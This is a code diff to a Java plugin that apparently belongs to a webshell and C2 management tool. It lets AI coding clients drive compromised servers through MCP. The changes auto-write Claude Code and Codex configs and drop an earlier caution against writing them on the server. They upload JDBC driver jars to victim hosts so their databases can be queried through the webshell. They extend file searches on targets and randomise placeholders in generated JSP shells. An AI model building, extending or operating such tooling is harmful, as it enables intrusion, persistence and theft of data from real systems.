@@ -742,9 +742,13 @@ public class McpService implements Plugin {
             System.out.println();
             System.out.println("Authorization: Bearer " + authToken);
             System.out.println();
-            System.out.println("Team client mcp.json (copy to each workstation, do not write on this server):");
+            System.out.println("Client mcp.json:");
             System.out.println(dummy.buildMcpJson(primary));
             System.out.println();
+            // Auto-write Claude Code + Codex client configs
+            System.out.println("[MCP] Writing client configs...");
+            System.out.print(dummy.doWriteClaudeConfigs(true));
+            System.out.print(dummy.doWriteCodexConfig(true));
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 if (server != null) { server.stop(0); running = false; }
                 System.out.println("[MCP] Server stopped.");
@@ -1750,6 +1754,24 @@ public class McpService implements Plugin {
         try { os = pl.getOsInfo(); } catch (Exception ignored) {}
         boolean isWin = os != null && os.toLowerCase().contains("win");
 
+        // --- stage 0: target's own report beats any code-page guess ---
+        // Java payloads decode every parameter with Charset.defaultCharset(), i.e.
+        // file.encoding. Since JDK 18 (JEP 400) that is UTF-8 regardless of the OEM
+        // code page, so on a GBK Windows box chcp says 936 while the payload really
+        // wants UTF-8 -- the two disagree and only the target knows. BasicInfoModule
+        // dumps all system properties, so the value is already in the basics info.
+        try {
+            String basics = pl.getBasicsInfo();
+            if (basics != null) {
+                java.util.regex.Matcher m = java.util.regex.Pattern
+                        .compile("file\\.encoding\\s*:\\s*(\\S+)").matcher(basics);
+                if (m.find()) {
+                    String cs = m.group(1).trim();
+                    if (cs.length() > 0) return cs;
+                }
+            }
+        } catch (Exception ignored) {}
+
         // --- stage 1: code page / locale (ASCII digits survive wrong decode) ---
         try {
             String probe = isWin
@@ -2142,29 +2164,55 @@ public class McpService implements Plugin {
         String pattern = (String) a.get("pattern");
         if (pattern == null || pattern.isEmpty()) return "\u8bf7\u63d0\u4f9b pattern \u53c2\u6570";
         String path = (String) a.getOrDefault("path", pl.currentDir());
-        String normPat = pattern.replace("*", "").toLowerCase();
+        java.util.regex.Pattern re = globToRegex(pattern);
         StringBuilder sb = new StringBuilder();
         int found = 0;
         // Recursive search via getFile()
         java.util.LinkedList<String> dirs = new java.util.LinkedList<>();
+        java.util.HashSet<String> seen = new java.util.HashSet<>();
         dirs.add(path);
         int scanned = 0;
+        String firstError = null;
         while (!dirs.isEmpty() && scanned < 2000) {
             String dir = dirs.poll();
+            if (dir == null || !seen.add(dir.toLowerCase())) continue;
             try {
                 core.shell.GFile[] files = pl.getFile(dir);
                 if (files == null) continue;
                 for (core.shell.GFile f : files) {
                     scanned++;
                     if (f.isDirectory()) { dirs.add(f.getAbsolutePath()); continue; }
-                    if (f.getName().toLowerCase().contains(normPat)) {
+                    if (re.matcher(String.valueOf(f.getName())).matches()) {
                         sb.append(f.getAbsolutePath()).append(" (").append(f.length()).append(" bytes)\n");
                         found++;
                     }
                 }
-            } catch (Exception ignored) {}
+            } catch (Exception e) {
+                // Was "catch (Exception ignored)" - a single unreadable directory
+                // silently produced "not found" for the whole search.
+                if (firstError == null) firstError = dir + " -> " + e.getMessage();
+            }
         }
-        return found > 0 ? "\u627e\u5230 " + found + " \u4e2a\u6587\u4ef6:\n" + sb.toString() : "\u672a\u627e\u5230\u5339\u914d " + pattern + " \u7684\u6587\u4ef6";
+        if (found > 0) return "\u627e\u5230 " + found + " \u4e2a\u6587\u4ef6:\n" + sb.toString();
+        return "\u672a\u627e\u5230\u5339\u914d " + pattern + " \u7684\u6587\u4ef6 (\u5df2\u626b\u63cf " + scanned + " \u9879"
+                + (firstError != null ? ", \u90e8\u5206\u76ee\u5f55\u8bfb\u53d6\u5931\u8d25: " + firstError : "") + ")";
+    }
+
+    /** Shell-style glob (*, ?) -> case-insensitive regex matched against the file name. */
+    private static java.util.regex.Pattern globToRegex(String glob) {
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < glob.length(); i++) {
+            char c = glob.charAt(i);
+            switch (c) {
+                case '*': sb.append(".*"); break;
+                case '?': sb.append('.'); break;
+                case '.': case '\\': case '+': case '(': case ')': case '[': case ']':
+                case '{': case '}': case '^': case '$': case '|':
+                    sb.append('\\').append(c); break;
+                default: sb.append(c);
+            }
+        }
+        return java.util.regex.Pattern.compile(sb.toString(), java.util.regex.Pattern.CASE_INSENSITIVE);
     }
 
     private String netInfo(Map<String, Object> a) {
@@ -2342,6 +2390,20 @@ public class McpService implements Plugin {
 
 
     // --- Database: Shell \u5df2\u4fdd\u5b58\u8fde\u63a5 + \u539f\u7248 ShellDatabasePanel.execSql ---
+    /**
+     * DB failures bubble up from the payload layer, which reports a blank
+     * message when the target replies with something that is not a payload
+     * (read timeout, error page, JDBC driver missing). That used to surface as a
+     * bare "连接失败: " with nothing after it.
+     */
+    private static String dbFailMsg(String prefix, Exception ex) {
+        String m = ex == null ? null : ex.getMessage();
+        if (m == null || m.trim().isEmpty()) {
+            m = "目标端未返回可解析结果 (execSql 未正常执行; 常见原因: 目标端缺少 JDBC 驱动 / 读取超时 / 数据库不可达)";
+        }
+        return prefix + m.trim();
+    }
+
     private String dbConnect(Map<String, Object> a) {
         try {
             ShellEntity sh = getShellInit(a);
@@ -2358,18 +2420,18 @@ public class McpService implements Plugin {
             persistDbInfo(sh, dbInfo);
             rememberDbConfig(sh, dbInfo);
             String type = dbInfo.getDatabaseType();
-            String tpl = DatabaseSql.sqlMap.get(type.toLowerCase() + "-getAllDatabase");
+            String tpl = dbTemplate(type, "getAllDatabase");
             if (tpl == null) {
                 return "\u5df2\u5199\u5165\u8fde\u63a5 " + nvl(dbInfo.getConfigName()) + " \u4f46\u65e0\u5217\u5e93\u6a21\u677f: " + type;
             }
-            Object result = execViaDatabasePanel(sh, dbInfo, "select", tpl);
+            Object result = execDb(sh, dbInfo, "select", tpl);
             return "\u5df2\u7ecf WebShell \u8fde\u5e93: " + nvl(dbInfo.getConfigName())
                     + "\t" + type + "\t" + nvl(dbInfo.getHost()) + ":" + dbInfo.getPort()
                     + "\tuser=" + nvl(dbInfo.getUsername())
                     + "\tdb=" + nvl(dbInfo.getCurrentDatabase())
                     + "\n" + formatDbResult(result);
         } catch (Exception ex) {
-            return "\u8fde\u63a5\u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
+            return dbFailMsg("\u8fde\u63a5\u5931\u8d25: ", ex);
         }
     }
 
@@ -2382,9 +2444,9 @@ public class McpService implements Plugin {
             if (dbInfo == null) return dbNeedConfigHint(sh);
             rememberDbConfig(sh, dbInfo);
             String execType = inferExecType(sql, strArg(a.get("execType")));
-            return formatDbResult(execViaDatabasePanel(sh, dbInfo, execType, sql));
+            return formatDbResult(execDb(sh, dbInfo, execType, sql));
         } catch (Exception ex) {
-            return "SQL \u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
+            return dbFailMsg("SQL \u5931\u8d25: ", ex);
         }
     }
 
@@ -2425,14 +2487,14 @@ public class McpService implements Plugin {
             }
             String type = dbInfo.getDatabaseType();
             if (isBlank(type)) return "\u7f3a\u5c11 dbType";
-            String tpl = DatabaseSql.sqlMap.get(type.toLowerCase() + "-" + suffix);
+            String tpl = dbTemplate(type, suffix);
             if (tpl == null) return "\u4e0d\u652f\u6301\u7684\u6a21\u677f: " + type + "-" + suffix;
             String dbName = firstNonBlank(database, dbInfo.getCurrentDatabase(), "");
             String sql = tpl.replace("{databaseName}", dbName).replace("{tableName}", table == null ? "" : table);
             rememberDbConfig(sh, dbInfo);
-            return formatDbResult(execViaDatabasePanel(sh, dbInfo, "select", sql));
+            return formatDbResult(execDb(sh, dbInfo, "select", sql));
         } catch (Exception ex) {
-            return "\u67e5\u8be2\u5931\u8d25: " + (ex.getMessage() != null ? ex.getMessage() : ex.toString());
+            return dbFailMsg("\u67e5\u8be2\u5931\u8d25: ", ex);
         }
     }
 
@@ -2715,6 +2777,144 @@ public class McpService implements Plugin {
                 dbInfo.setDatabaseDrive(drives[0]);
             }
         } catch (Throwable ignored) {
+        }
+    }
+
+    /**
+     * SQL templates for DB types added after the jar-only core.ui.config.DatabaseSql
+     * class was compiled (DM8 / KingbaseES V8). Same {databaseName}/{tableName}
+     * placeholders and &lt;type&gt;-&lt;suffix&gt; keys as that map.
+     */
+    private static final java.util.Map<String, String> EXTRA_DB_SQL = new java.util.HashMap<String, String>();
+    static {
+        // 达梦 DM8：Oracle 兼容视图（DBeaver 的达梦插件同样用 ALL_TABLES ... WHERE owner=）
+        EXTRA_DB_SQL.put("dm-getAllDatabase", "SELECT USERNAME FROM ALL_USERS ORDER BY 1");
+        EXTRA_DB_SQL.put("dm-getTableByDatabase", "SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{databaseName}'");
+        EXTRA_DB_SQL.put("dm-getTableDataByDT", "SELECT * FROM \"{databaseName}\".\"{tableName}\" WHERE ROWNUM<=10");
+        EXTRA_DB_SQL.put("dm-getCountByDT", "SELECT COUNT(1) FROM \"{databaseName}\".\"{tableName}\"");
+        // 人大金仓 KingbaseES V8：PostgreSQL 兼容，模板与 postgresql 同形
+        EXTRA_DB_SQL.put("kingbase-getAllDatabase", "SELECT datname FROM pg_database where datistemplate='f'");
+        EXTRA_DB_SQL.put("kingbase-getTableByDatabase", "SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema NOT IN ('pg_catalog', 'information_schema')");
+        EXTRA_DB_SQL.put("kingbase-getTableDataByDT", "SELECT * FROM \"{tableName}\" limit 10");
+        EXTRA_DB_SQL.put("kingbase-getCountByDT", "SELECT COUNT(1) FROM \"{tableName}\"");
+    }
+
+    /** DatabaseSql first, then the built-in extras. */
+    private static String dbTemplate(String type, String suffix) {
+        if (type == null) return null;
+        String key = type.toLowerCase() + "-" + suffix;
+        String tpl = DatabaseSql.sqlMap.get(key);
+        return tpl != null ? tpl : EXTRA_DB_SQL.get(key);
+    }
+
+    /** Bundled JDBC driver asset name for a DB type (see JarLoader.DB_JARS). */
+    private static String bundledDbJarName(String dbType) {
+        if (dbType == null) return null;
+        String t = dbType.trim().toLowerCase();
+        if (t.contains("mysql") || t.contains("maria")) return "mysql";
+        if (t.contains("oracle")) return "ojdbc5";
+        if (t.contains("sqlserver") || t.contains("mssql")) return "sqljdbc41";
+        if (t.contains("dm") || t.contains("dameng")) return "dm";
+        if (t.contains("kingbase") || t.contains("kes")) return "kingbase";
+        return null;
+    }
+
+    /** shellId|dbType whose driver availability on the target is already settled. */
+    private static final java.util.Set<String> dbDriverReady =
+            java.util.Collections.synchronizedSet(new java.util.HashSet<String>());
+    /** shellId|dbType whose bundled driver jar has already been shipped. */
+    private static final java.util.Set<String> dbDriverShipped =
+            java.util.Collections.synchronizedSet(new java.util.HashSet<String>());
+
+    /**
+     * Make sure the target can load a JDBC driver for this DB type: ask the
+     * JarLoader plugin whether the driver class exists on the target's
+     * classpath, and ship the bundled assets/&lt;name&gt;.jar only when it does
+     * not. The GUI DatabaseManage panel has a manual "LoadDbJar" button for the
+     * same job; the MCP path had no equivalent and just failed on a target
+     * without the driver (WEB-INF/lib etc.).
+     *
+     * Never throws: if the check itself fails the caller falls back to a plain
+     * execute and reports whatever the payload says.
+     */
+    private boolean ensureDbDriver(ShellEntity sh, DbInfo dbInfo) {
+        if (sh == null || dbInfo == null) return false;
+        String key = sh.getId() + "|" + dbInfo.getDatabaseType();
+        if (dbDriverReady.contains(key)) return true;
+        String driver = dbInfo.getDatabaseDrive();
+        try {
+            Class<?> jl = Class.forName("shells.plugins.java.JarLoader");
+            Object plugin = jl.newInstance();
+            jl.getMethod("init", ShellEntity.class).invoke(plugin, sh);
+            if (driver != null && !driver.trim().isEmpty()) {
+                Object has = jl.getMethod("hasClass", String.class).invoke(plugin, driver.trim());
+                if (Boolean.TRUE.equals(has)) {
+                    Log.log("[MCP] JDBC driver already on target classpath: " + driver);
+                    dbDriverReady.add(key);
+                    return true;
+                }
+                Log.log("[MCP] JDBC driver missing on target: " + driver);
+            }
+            return shipBundledDbDriver(sh, dbInfo, plugin, jl);
+        } catch (Throwable t) {
+            Log.log("[MCP] JDBC driver check failed: " + t);
+            return false;
+        }
+    }
+
+    /** Ship shells/plugins/java/assets/&lt;jdbc&gt;.jar to the target once per shell+type. */
+    private boolean shipBundledDbDriver(ShellEntity sh, DbInfo dbInfo, Object plugin, Class<?> jl) {
+        String name = bundledDbJarName(dbInfo.getDatabaseType());
+        if (name == null) return false;
+        String key = sh.getId() + "|" + dbInfo.getDatabaseType();
+        if (dbDriverShipped.contains(key)) return true;
+        try {
+            java.io.InputStream in = McpService.class.getResourceAsStream("/shells/plugins/java/assets/" + name + ".jar");
+            if (in == null) {
+                Log.log("[MCP] bundled driver asset missing: " + name + ".jar");
+                return false;
+            }
+            byte[] jar = util.functions.readInputStreamAutoClose(in);
+            Object ok = jl.getMethod("loadJar", byte[].class).invoke(plugin, new Object[]{jar});
+            Log.log("[MCP] shipped bundled JDBC driver " + name + ".jar (" + jar.length + " bytes) -> " + ok);
+            if (Boolean.TRUE.equals(ok)) {
+                dbDriverShipped.add(key);
+                dbDriverReady.add(key);
+                return true;
+            }
+        } catch (Throwable t) {
+            Log.log("[MCP] bundled driver upload failed: " + t);
+        }
+        return false;
+    }
+
+    /**
+     * Run a DB statement. The driver is made available first (classpath probe,
+     * upload only if missing); if that could not be settled and the execute
+     * still fails, force the upload once and retry - a target without the driver
+     * answers with an empty/unparseable payload rather than "class not found".
+     */
+    private Object execDb(ShellEntity sh, DbInfo dbInfo, String execType, String sql) throws Exception {
+        boolean ready = ensureDbDriver(sh, dbInfo);
+        try {
+            return execViaDatabasePanel(sh, dbInfo, execType, sql);
+        } catch (Exception first) {
+            if (ready || sh == null || dbInfo == null) throw first;
+            String key = sh.getId() + "|" + dbInfo.getDatabaseType();
+            if (dbDriverShipped.contains(key) || !forceShipBundledDbDriver(sh, dbInfo)) throw first;
+            return execViaDatabasePanel(sh, dbInfo, execType, sql);
+        }
+    }
+
+    private boolean forceShipBundledDbDriver(ShellEntity sh, DbInfo dbInfo) {
+        try {
+            Class<?> jl = Class.forName("shells.plugins.java.JarLoader");
+            Object plugin = jl.newInstance();
+            jl.getMethod("init", ShellEntity.class).invoke(plugin, sh);
+            return shipBundledDbDriver(sh, dbInfo, plugin, jl);
+        } catch (Throwable t) {
+            Log.log("[MCP] forced driver upload failed: " + t);
+            return false;
         }
     }
 
@@ -3043,6 +3243,11 @@ public class McpService implements Plugin {
                 java.lang.reflect.Constructor<?> ctor = tplClass.getConstructor(C2ProfileContext.class, String.class, String.class, java.util.HashMap.class);
                 Object template = ctor.newInstance(c2ProfileCtx, payload, "jsp", new java.util.HashMap<>());
                 shellBytes = (byte[]) template.getClass().getMethod("generate").invoke(template);
+                // GUI 的 C2Channel.generate(pass,key,ctx) 在这里会跑 TemplateEx.run()，
+                // 把所有 {xxx} 占位符（{randomStr}/{pass}/{secretKey} 等）替换成随机值。
+                // 漏掉它的话 {randomStr} 会以字面量留在 JSP 里，同一个 Tomcat 上所有
+                // C2 壳共用同一个 ServletContext 属性名，互相串。
+                shellBytes = util.TemplateEx.run(new String(shellBytes)).getBytes();
                 // Apply template preprocessor (e.g. jsp -> escape special chars)
                 shellBytes = core.shellprocessor.StartProcessor.process(shellBytes, "jsp");
             } else {
@@ -3349,15 +3554,15 @@ public class McpService implements Plugin {
         for (int i = 0; i < kv.length; i += 2) { if (i>0)sb.append(","); sb.append("\"").append(kv[i]).append("\":").append(toJson(kv[i+1])); }
         return sb.append("}").toString();
     }
-    private static String m(Object... kv) {
+    private static Raw m(Object... kv) {
         StringBuilder sb = new StringBuilder("{");
         for (int i = 0; i < kv.length; i += 2) { if (i>0)sb.append(","); sb.append("\"").append(kv[i]).append("\":").append(toJson(kv[i+1])); }
-        return sb.append("}").toString();
+        return new Raw(sb.append("}").toString());
     }
-    private static String a(Object... items) {
+    private static Raw a(Object... items) {
         StringBuilder sb = new StringBuilder("[");
         for (int i = 0; i < items.length; i++) { if (i>0)sb.append(","); sb.append(toJson(items[i])); }
-        return sb.append("]").toString();
+        return new Raw(sb.append("]").toString());
     }
     private static String t(String name, String desc, String inputSchema) {
         return "{\"name\":\""+esc(name)+"\",\"description\":\""+esc(desc)+"\",\"inputSchema\":"+inputSchema+"}";
@@ -3386,15 +3591,25 @@ public class McpService implements Plugin {
     private static String s(String desc) { return desc; }
     private static String i() { return "{\"type\":\"integer\",\"description\":\"\"}"; }
 
+    /** Pre-built JSON fragment: emitted verbatim by toJson(), never quoted. */
+    private static final class Raw {
+        final String json;
+        Raw(String json) { this.json = json; }
+        public String toString() { return json; }
+    }
+
     private static String toJson(Object v) {
         if (v == null) return "null";
+        if (v instanceof Raw) return ((Raw) v).json;
         if (v instanceof Boolean) return v.toString();
         if (v instanceof Number) return v.toString();
-        if (v instanceof String) {
-            String s = (String) v;
-            if (s.startsWith("{") || s.startsWith("[")) return s;
-            return "\"" + esc(s) + "\"";
-        }
+        // Every String is a JSON string literal. It used to be passed through
+        // unquoted whenever it started with '{' or '[' so that pre-built JSON
+        // could be nested; that also caught plain tool output such as
+        // oplog_query's "[2026-06-24 09:22:01] nox | ..." lines and emitted
+        // invalid JSON, which broke the client with "MCP error -3" and dropped
+        // the SSE stream. Nested JSON now goes through Raw instead.
+        if (v instanceof String) return "\"" + esc((String) v) + "\"";
         return "\"" + esc(v.toString()) + "\"";
     }
     private static String esc(String s) {
@@ -3408,7 +3623,11 @@ public class McpService implements Plugin {
                 case '\n': sb.append("\\n"); break;
                 case '\r': sb.append("\\r"); break;
                 case '\t': sb.append("\\t"); break;
-                default: sb.append(c);
+                default:
+                    // Other C0 control characters are not legal raw inside a JSON
+                    // string either (target output can contain them).
+                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
+                    else sb.append(c);
             }
         }
         return sb.toString();
